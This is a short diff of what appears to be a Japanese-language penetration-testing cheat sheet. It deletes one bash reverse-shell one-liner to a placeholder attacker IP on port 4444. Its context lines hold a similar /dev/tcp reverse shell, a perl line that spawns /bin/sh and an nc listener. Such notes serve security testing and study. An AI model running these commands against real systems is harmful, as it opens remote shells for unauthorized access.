@@ -40,12 +40,6 @@ bash -i >& /dev/tcp/<攻撃者IP>/<ポート番号> 0>&1
 perl -e 'exec "/bin/sh";'
 ```
 
-shellが/bin/shの場合
-
-```sh
-bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
-```
-
 # サスペンド（一時停止）
 ```zsh
 rlwrap -cAr nc -lvnp 18000
